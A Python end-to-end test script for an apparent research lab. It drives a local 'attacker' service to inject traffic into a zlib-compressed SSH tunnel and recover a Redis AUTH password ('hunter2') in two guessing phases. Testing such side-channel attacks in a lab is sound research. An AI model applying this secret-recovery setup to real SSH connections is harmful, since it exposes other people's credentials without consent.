"""End-to-end verification for the direct-injection scenario (Section 5.1).

Run from the host while the docker-compose stack is up:

    python scripts/verify_direct.py

Checks: HTTP control APIs reachable, SSH up with zlib compression, Redis
tunnel active, packets observed during Redis AUTH and during a payload
injection through the tunnel, and a two-phase recovery of "hunter2".
"""

from __future__ import annotations

import json
import sys
import time
import urllib.error
import urllib.request
from typing import Any, NoReturn

ATTACKER_BASE = "http://127.0.0.1:9000"
CLIENT_BASE = "http://127.0.0.1:8000"


def http(method: str, url: str, body: bytes | None = None) -> dict[str, Any]:
    req = urllib.request.Request(url, method=method, data=body)
    with urllib.request.urlopen(req, timeout=10) as resp:
        raw = resp.read()
    if not raw:
        return {}
    return json.loads(raw)


def wait_for(url: str, label: str, timeout: float = 60.0) -> None:
    deadline = time.time() + timeout
    last_err: Exception | None = None
    while time.time() < deadline:
        try:
            http("GET", url)
            print(f"  [ok] {label} reachable")
            return
        except (urllib.error.URLError, ConnectionResetError, OSError) as exc:
            last_err = exc
            time.sleep(1.0)
    raise SystemExit(f"!! {label} never came up: {last_err}")


def step(title: str) -> None:
    print()
    print("=" * 72)
    print(title)
    print("=" * 72)


def fail(msg: str) -> NoReturn:
    print(f"FAIL: {msg}")
    sys.exit(1)


def _run_attack(scenario: str, known_prefix: str, alphabet: str,
                max_length: int) -> dict[str, Any]:
    body = json.dumps({
        "scenario": scenario,
        "config": {
            "known_prefix": known_prefix,
            "alphabet": alphabet,
            "max_length": max_length,
        },
    }).encode("utf-8")
    req = urllib.request.Request(
        f"{ATTACKER_BASE}/run_attack",
        method="POST",
        data=body,
        headers={"Content-Type": "application/json"},
    )
    with urllib.request.urlopen(req, timeout=3600) as resp:
        return json.loads(resp.read())


def main() -> int:
    step("1. Wait for HTTP control APIs")
    wait_for(f"{ATTACKER_BASE}/status", "attacker")
    wait_for(f"{CLIENT_BASE}/status", "client")

    step("2. Inspect client SSH state")
    cs = http("GET", f"{CLIENT_BASE}/status")
    print(json.dumps(cs, indent=2))

    if not cs.get("ssh_connected"):
        fail("client reports ssh_connected=false")

    send_alg = cs.get("ssh_send_compression")
    recv_alg = cs.get("ssh_recv_compression")
    if send_alg not in ("zlib", "zlib@openssh.com"):
        fail(f"send compression is {send_alg!r}, expected zlib*")
    if recv_alg not in ("zlib", "zlib@openssh.com"):
        fail(f"recv compression is {recv_alg!r}, expected zlib*")
    print(f"  [ok] compression negotiated: send={send_alg} recv={recv_alg}")

    pf = cs.get("port_forwards", {})
    redis_ok = pf.get("redis_tunnel", {}).get("active")
    if not redis_ok:
        fail("Redis tunnel port forward not active")
    print(f"  [ok] port forward active: redis={pf['redis_tunnel']}")

    step("3. Inspect attacker state")
    asn = http("GET", f"{ATTACKER_BASE}/status")
    print(json.dumps(asn, indent=2))

    step("4. Trigger Redis AUTH (send_secret) and capture packet log")
    http("POST", f"{ATTACKER_BASE}/clear_log")
    secret_trigger = http("POST", f"{ATTACKER_BASE}/trigger_secret")
    print(f"  [..] trigger_secret response: {secret_trigger}")
    time.sleep(0.4)
    log = http("GET", f"{ATTACKER_BASE}/packet_log")
    secret_records = log["records"]
    print(f"  [..] {log['count']} non-ack TCP segments captured")
    for r in secret_records:
        print(f"      {r['src']}:{r['sport']} -> {r['dst']}:{r['dport']}  "
              f"len={r['tcp_payload_len']:5d}  flags={r['flags']}")
    if not secret_records:
        fail("no TCP segments observed during Redis AUTH")
    print("  [ok] attacker observed packets while Redis AUTH was sent")

    step("5. Inject payload through Redis tunnel and capture packet log")
    http("POST", f"{ATTACKER_BASE}/clear_log")
    payload = b"*1\r\n$4\r\nPING\r\n"
    payload_trigger = http("POST", f"{ATTACKER_BASE}/trigger_payload",
                           body=payload)
    print(f"  [..] trigger_payload response: {payload_trigger}")
    time.sleep(0.4)
    log = http("GET", f"{ATTACKER_BASE}/packet_log")
    payload_records = log["records"]
    print(f"  [..] {log['count']} non-ack TCP segments captured")
    for r in payload_records:
        print(f"      {r['src']}:{r['sport']} -> {r['dst']}:{r['dport']}  "
              f"len={r['tcp_payload_len']:5d}  flags={r['flags']}")
    if not payload_records:
        fail("no TCP segments observed during Redis tunnel injection")
    print("  [ok] attacker observed packets while injecting through Redis tunnel")

    step("6. Direct scenario: recover hunter2 through /run_attack")
    http("POST", f"{CLIENT_BASE}/set_secret",
         body=json.dumps({"value": "hunter2"}).encode("utf-8"))
    time.sleep(2.0)

    RESP_PREFIX = "*3\r\n$4\r\nAUTH\r\n$7\r\ndefault\r\n$"
    t0 = time.time()
    r1 = _run_attack("direct", RESP_PREFIX, "0123456789", 4)
    if not r1.get("ok"):
        fail(f"phase 1 failed: {r1}")
    pw_len = r1["recovered"]
    print(f"  phase 1: length = {pw_len} ({r1['elapsed_seconds']:.1f}s, "
          f"{r1['total_guesses']} guesses)")

    r2 = _run_attack(
        "direct", RESP_PREFIX + pw_len + "\r\n",
        "abcdefghijklmnopqrstuvwxyz0123456789", int(pw_len) + 4,
    )
    if not r2.get("ok"):
        fail(f"phase 2 failed: {r2}")
    password = r2["recovered"].rstrip("\r")
    elapsed = time.time() - t0
    print(f"  phase 2: password = {password!r} "
          f"({r2['elapsed_seconds']:.1f}s, {r2['total_guesses']} guesses)")
    print(f"  Total elapsed: {elapsed:.1f}s  "
          f"total guesses: {r1['total_guesses'] + r2['total_guesses']}")
    if password != "hunter2":
        fail(f"recovered {password!r}, expected 'hunter2'")
    print("  [ok] hunter2 recovered")

    step("VERIFICATION PASSED")
    return 0


if __name__ == "__main__":
    sys.exit(main())
